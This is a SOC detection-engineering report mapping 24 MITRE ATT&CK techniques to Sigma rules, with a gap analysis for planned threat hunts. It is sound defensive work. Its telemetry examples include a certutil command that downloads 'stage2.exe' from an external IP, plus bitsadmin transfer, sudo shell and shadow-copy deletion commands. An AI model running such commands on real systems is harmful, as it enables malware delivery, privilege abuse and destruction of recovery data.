# MITRE ATT&CK Coverage Matrix & Gap Analysis

**Project Code:** `CDL-DET-V2`  
**Engagement:** Cyberion Defense Labs Detection Engineering & Threat Hunting  
**Assessed Framework:** MITRE ATT&CK Enterprise v14  
**Author:** Abhijeet Amarnath Sharma - Senior Detection Engineer  
**Date:** 2026-08-15  
**Version:** 2.0.0  
**Status:** Approved / Active Baseline  

---

## 1. Executive Summary & Coverage Metrics

This document provides a comprehensive mapping and evaluation of SOC detection posture across **24 assessed MITRE ATT&CK techniques** spanning **10 enterprise tactics** (Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Discovery, Credential Access, Lateral Movement, Command and Control, Exfiltration, Impact).

Detection rules are implemented using the **Sigma standard** with deterministic detection logic verified against realistic multi-source enterprise telemetry datasets (`datasets/windows_security_sysmon_sample.json`, `datasets/zeek_network_sample.json`, and `datasets/linux_auth_auditd_sample.json`).

### High-Level Coverage Dashboard

| Metric | Count | Percentage |
| :--- | :---: | :---: |
| **Total Assessed Techniques** | **24** | **100.0%** |
| 🟢 **Covered (Automated Sigma Detections)** | **19** | **79.2%** |
| 🟡 **Partially Covered (Log Ingestion / Hunt Queries)** | **2** | **8.3%** |
| 🔴 **Not Covered / Dedicated Threat Hunt Targets** | **3** | **12.5%** |
| **Total Active Production Sigma Rules** | **16** | -- |
| **Rule Engine Validation Pass Rate** | **16 / 16 (100%)** | **100.0%** |
| **Total True-Positive Telemetry Matches** | **67** | -- |
| **Benign Baseline False-Positive Triggers** | **0** | **0.0%** |

### Tactical Coverage Breakdown

```text
[Initial Access]        ████████░░░░░░░░░░  50.0% (1 Covered, 1 Not Covered)
[Execution]             ██████████████████  100.0% (2 Covered)
[Persistence]           ██████████████████  100.0% (3 Covered)
[Privilege Escalation]  ████████████░░░░░░  75.0% (1 Covered, 1 Partially Covered)
[Defense Evasion]       ██████░░░░░░░░░░░░  33.3% (1 Covered, 2 Hunt Targets)
[Discovery]             ██████████░░░░░░░░  50.0% (1 Partially Covered)
[Credential Access]     ██████████████████  100.0% (5 Covered)
[Lateral Movement]      ██████████████████  100.0% (2 Covered)
[Command and Control]   ██████████████████  100.0% (2 Covered)
[Exfiltration]          ██████████████████  100.0% (1 Covered)
[Impact]                ██████████████████  100.0% (1 Covered)
```

---

## 2. Detailed MITRE ATT&CK Matrix (24 Assessed Techniques)

| # | Technique ID | Technique Name | Tactic | Coverage Status | Supporting Sigma Rule ID | Supporting Sigma Rule Filename | Log Source Required | Validation Match Count | Gap Analysis & Threat Hunting Notes |
| :-: | :--- | :--- | :--- | :---: | :--- | :--- | :--- | :-: | :--- |
| **1** | `T1078` | Valid Accounts | Initial Access | 🟢 **Covered** | `a1b2c3d4-e5f6-7890-abcd-ef1234567890` | `rules/initial_access/sigma_win_valid_accounts_compromised_logon.yml` | Windows Security (EID 4624) | 2 | Detects anomalous external/remote logons on compromised service and user accounts. |
| **2** | `T1566.001` | Spearphishing Attachment | Initial Access | 🔴 **Not Covered** | *None (Telemetry Gap)* | *N/A* | Email Gateway / MS Defender for O365 | 0 | **Gap:** Telemetry gap in current host-only telemetry baseline. Recommendation: Ingest Proofpoint/M365 email telemetry. |
| **3** | `T1059.001` | PowerShell | Execution | 🟢 **Covered** | `b2c3d4e5-f6a7-8901-bcde-f12345678901` | `rules/execution/sigma_win_powershell_encoded_command.yml` | Windows Security (4688) / Sysmon (1) | 2 | Detects Base64-encoded command execution flags (`-enc`, `-EncodedCommand`). |
| **4** | `T1053.005` | Scheduled Task | Execution, Persistence | 🟢 **Covered** | `c3d4e5f6-a7b8-9012-cdef-123456789012` | `rules/execution/sigma_win_schtasks_suspicious_creation.yml` | Windows Security (4688) / Sysmon (1) | 6 | Detects `schtasks /create` pointing to staging directories (Temp, AppData) running as SYSTEM. |
| **5** | `T1053.003` | Cron | Persistence | 🟢 **Covered** | `84d29921-cdb4-49d1-855f-c771efd52967` | `rules/persistence/sigma_lnx_cron_persistence_modification.yml` | Linux auditd / Linux auth | 3 | Detects rogue `/etc/cron*` modifications and crontab interactive edits by non-root users. |
| **6** | `T1547.001` | Registry Run Keys / Startup Folder | Persistence | 🟢 **Covered** | `e5f6a7b8-c9d0-1234-efab-345678901234` | `rules/persistence/sigma_win_registry_run_key_persistence.yml` | Windows Security (4688) / Sysmon (1) | 2 | Detects unauthorized additions to HKLM/HKCU `...\CurrentVersion\Run` persistence keys. |
| **7** | `T1136.001` | Local Account | Persistence | 🟢 **Covered** | `ccb8c702-8a68-48a5-b2c7-9a80c6e7491a` | `rules/persistence/sigma_win_unauthorized_local_account_privilege_chain.yml` | Windows Security (4720, 4732) | 2 | **Correlation Rule #1:** Correlates local account creation with addition to local Administrators within 5m. |
| **8** | `T1098` | Account Manipulation | Persistence, Privilege Escalation | 🟢 **Covered** | `ccb8c702-8a68-48a5-b2c7-9a80c6e7491a` | `rules/persistence/sigma_win_unauthorized_local_account_privilege_chain.yml` | Windows Security (EID 4732) | 2 | Covered via Administrator group membership escalation correlation rule. |
| **9** | `T1548.003` | Sudo and Sudo Caching | Privilege Escalation | 🟡 **Partially Covered** | *None (Threat Hunt Target)* | *N/A* | Linux auditd / Linux auth | 0 | **Strategic Gap:** Sudo executions are captured in auditd/auth telemetry but reserved for Phase 3 Threat Hunt `TH-002` (Linux Privilege Escalation). |
| **10** | `T1027` | Obfuscated Files or Information | Defense Evasion | 🟢 **Covered** | `b2c3d4e5-f6a7-8901-bcde-f12345678901` | `rules/execution/sigma_win_powershell_encoded_command.yml` | Windows Security (4688) / Sysmon (1) | 2 | Covered via PowerShell Base64 payload obfuscation detection. |
| **11** | `T1105` | Ingress Tool Transfer | Defense Evasion, Command and Control | 🔴 **Not Covered** | *None (Threat Hunt Target)* | *N/A* | Windows Security (4688) / Sysmon (1) | 0 | **Strategic Gap:** `certutil.exe -urlcache -split -f` left uncovered by design to satisfy PRD Section 4.4 for Phase 3 Threat Hunt `TH-001`. |
| **12** | `T1197` | BITS Jobs | Defense Evasion, Persistence | 🔴 **Not Covered** | *None (Threat Hunt Target)* | *N/A* | Windows Security (4688) / Microsoft-Windows-Bits-Client | 0 | **Strategic Gap:** `bitsadmin.exe /transfer` left uncovered by design to serve as an unalerted hypothesis target in Phase 3 Threat Hunt `TH-001`. |
| **13** | `T1087` | Account Discovery | Discovery | 🟡 **Partially Covered** | *None (Threat Hunt Target)* | *N/A* | Windows Security (EID 4688) | 0 | High false-positive noise in automated rules due to benign IT discovery. Covered via proactive hunting queries in Phase 3 `TH-001`. |
| **14** | `T1110.001` | Password Guessing | Credential Access | 🟢 **Covered** | `bf992871-ef33-44c2-b0d2-22b47d9196e5` | `rules/credential_access/sigma_win_brute_force_to_success_correlation.yml` | Windows Security (EID 4625) | 8 | **Correlation Rule #2:** Multi-event threshold correlation detecting >3 failed external logon attempts within 5m. |
| **15** | `T1110.003` | Password Spraying | Credential Access | 🟢 **Covered** | `034b2474-e370-4595-b27f-76d8daa7e600` | `rules/credential_access/sigma_lnx_ssh_password_spray_and_shadow_access.yml` | Linux auth.log (sshd) | 10 | Detects distributed SSH authentication failures across multiple distinct usernames. |
| **16** | `T1558.003` | Kerberoasting | Credential Access | 🟢 **Covered** | `34f07646-4cd2-43ee-b6eb-74a384030bed` | `rules/credential_access/sigma_win_kerberoasting_rc4_ticket_request.yml` | Windows Security (EID 4769) | 2 | Detects Kerberos TGS requests for service accounts utilizing weak RC4-HMAC encryption (0x17). |
| **17** | `T1003.001` | LSASS Memory | Credential Access | 🟢 **Covered** | `14335991-00c8-4591-a57a-3a74fbf4d4de` | `rules/credential_access/sigma_win_lsass_memory_dump_access.yml` | Sysmon (EID 10) | 2 | Detects suspicious process open access to `lsass.exe` with `0x1010` / `0x1fffff` GrantedAccess rights. |
| **18** | `T1003.008` | /etc/passwd and /etc/shadow | Credential Access | 🟢 **Covered** | `034b2474-e370-4595-b27f-76d8daa7e600` | `rules/credential_access/sigma_lnx_ssh_password_spray_and_shadow_access.yml` | Linux auditd (SYSCALL / PATH) | 10 | Detects unauthorized system calls attempting open access on `/etc/shadow`. |
| **19** | `T1021.001` | Remote Desktop Protocol | Lateral Movement | 🟢 **Covered** | `d20b0e40-70e6-44f2-ae67-7ade870bb576` | `rules/lateral_movement/sigma_zeek_internal_rdp_smb_lateral_pivot.yml` | Zeek conn.log (Port 3389) | 5 | Detects internal peer-to-peer RDP network pivoting across workstation/server subnets. |
| **20** | `T1021.002` | SMB/Windows Admin Shares | Lateral Movement | 🟢 **Covered** | `c92ff287-f57a-49a9-9805-7cc963163a07` | `rules/lateral_movement/sigma_win_smb_admin_share_lateral_movement.yml` | Windows Security (5140, 5145) | 3 | Detects network access to default administrative shares (`ADMIN$`, `C$`, `IPC$`) and `config\SAM`. |
| **21** | `T1071.001` | Web Protocols (HTTPS) | Command and Control | 🟢 **Covered** | `6403c20f-8e8d-4589-866c-5fb8580b32e0` | `rules/command_and_control/sigma_zeek_https_c2_periodic_beaconing.yml` | Zeek conn.log (Port 443) | 12 | **Correlation Rule #3:** Outbound HTTPS beaconing correlation detecting repeated connections to external C2 IPs. |
| **22** | `T1572` | Protocol Tunneling | Command and Control | 🟢 **Covered** | `a91a97c0-a59f-4cd8-8555-b8cde32ea739` | `rules/command_and_control/sigma_zeek_dns_tunneling_anomalous_txt.yml` | Zeek dns.log (Port 53 TXT) | 4 | Detects anomalous high-entropy TXT queries directed to exfiltration and tunneling subdomains. |
| **23** | `T1048` | Exfiltration Over Alternative Protocol | Exfiltration | 🟢 **Covered** | `1f3919f5-22ae-4796-a771-70d4d88e6afc` | `rules/exfiltration/sigma_zeek_high_volume_exfil_nonstandard_port.yml` | Zeek conn.log (Port 8443) | 2 | Detects anomalous outbound data transfers (>10 MB) over non-standard ports to external IPs. |
| **24** | `T1490` | Inhibit System Recovery | Impact | 🟢 **Covered** | `d4e5f6a7-b8c9-0123-defa-234567890123` | `rules/execution/sigma_win_vssadmin_shadow_copy_deletion.yml` | Windows Security (4688) / Sysmon (1) | 2 | Detects shadow copy deletion via `vssadmin delete shadows` or `wmic shadowcopy delete`. |

---

## 3. Strategic Gap Analysis & Phase 3 Threat Hunting Alignment

### PRD Section 4.4 Intentional Detection Gaps

To satisfy the engineering requirements of **Phase 3 Threat Hunting Engagement (Module 4.4)**, specific adversary techniques have been deliberately excluded from the automated Sigma alerting catalog. In an enterprise SOC, creating static detection rules for dual-use administrative utilities (`certutil.exe`, `bitsadmin.exe`, `net.exe`) often introduces untenable false-positive alerting volumes. Instead, these techniques are evaluated through hypothesis-driven threat hunting:

1. **`T1105` (Ingress Tool Transfer - `certutil.exe`):**
   * *Status:* 🔴 Not Covered by automated rule.
   * *Telemetry Present:* Windows EventID 4688 and Sysmon EventID 1 record `certutil.exe -urlcache -split -f http://185.220.101.45/stage2.exe`.
   * *SOC Hunt Roadmap:* Primary hypothesis for Phase 3 Threat Hunt `TH-001` (Living-off-the-Land Binary Egress Transfer).
2. **`T1197` (BITS Jobs - `bitsadmin.exe`):**
   * *Status:* 🔴 Not Covered by automated rule.
   * *Telemetry Present:* Sysmon EventID 1 and EventID 4688 record `bitsadmin.exe /transfer job1 ...`.
   * *SOC Hunt Roadmap:* Secondary hypothesis for Phase 3 Threat Hunt `TH-001`.
3. **`T1548.003` (Abuse Elevation Control: Sudo Abuse):**
   * *Status:* 🟡 Partially Covered.
   * *Telemetry Present:* Auditd syscall records and auth.log capture `sudo /bin/bash` by user `svc_backup`.
   * *SOC Hunt Roadmap:* Primary hypothesis for Phase 3 Threat Hunt `TH-002` (Linux Privilege Escalation & Persistence Hunting).
4. **`T1087` (Account Discovery):**
   * *Status:* 🟡 Partially Covered.
   * *Telemetry Present:* `net user`, `whoami /priv`, `id` commands exist in baseline.
   * *SOC Hunt Roadmap:* Covered via contextual process tree hunting queries in `TH-001`.
5. **`T1566.001` (Spearphishing Attachment):**
   * *Status:* 🔴 Not Covered.
   * *Telemetry Gap:* Host endpoint logs lack inbound SMTP/MIME message metadata. Recommendation provided for Phase 4 architecture.

---

## 4. ATT&CK Navigator Visualization

The MITRE ATT&CK Navigator visualization layer is maintained in:
`mitre_attack/cyberion_attack_navigator_layer.json`

To render this layer in the official MITRE ATT&CK Navigator:
1. Navigate to [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/).
2. Select **Open Existing Layer** -> **Upload from local file**.
3. Select `mitre_attack/cyberion_attack_navigator_layer.json`.
4. Inspect the color-coded posture:
   * 🟢 **Green (`#2ecc71`, Score 100):** Covered by production Sigma detection.
   * 🟡 **Amber (`#f39c12`, Score 50):** Partially covered / Telemetry logged.
   * 🔴 **Red (`#e74c3c`, Score 0):** Uncovered / Phase 3 Threat Hunt Target.

---

*Verified with Cyberion Defense Labs Rule Validation Harness (`scripts/validate_rules.py`).*
